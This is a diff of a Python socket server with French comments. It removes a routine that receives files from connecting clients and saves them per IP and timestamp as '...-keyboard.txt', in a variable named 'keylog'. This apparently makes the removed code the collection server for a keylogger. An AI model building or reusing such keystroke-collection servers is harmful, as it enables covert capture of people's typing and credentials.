@@ -3,7 +3,6 @@ import socket
 import sys
 import os
 import time
-from datetime import datetime
 
 fin = True
 
@@ -15,16 +14,6 @@ def receive(client):
     if not requete :
         print('close')
         
-
-def receive_file(filename, client_socket, destination_folder):
-    full_path = os.path.join(destination_folder, filename)
-    with open(full_path, 'wb') as file:
-        while True:
-            keylog = client_socket.recv(4096)
-            if not keylog  :
-                break
-            file.write(keylog)
-
 
 def send(client):
     global fin
@@ -57,22 +46,6 @@ class threadforclient(Thread):
 
 #----------------------------------------------------------
 
-
-def conexion(clientSocket):
-        # IP du client
-    client_ip = clientSocket[0]
-
-    # Heure actuelle
-    heure_actuelle = datetime.now()
-    # Formatage de l'heure actuelle
-    heure_formattee = heure_actuelle.strftime("%Y-%m-%d_%H-%M-%S")
-    # Remplacement des caractères non valides dans le nom du fichier
-    heure_formattee = heure_formattee.replace(":", "-").replace(" ", "/")
-
-    print("Nouvelle connexion entrante:", clientSocket)
-    # Réception du fichier envoyé par le client
-    filename = f"{client_ip}-{heure_formattee}-keyboard.txt"
-    receive_file(filename, clientSocket, save_folder)
 
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
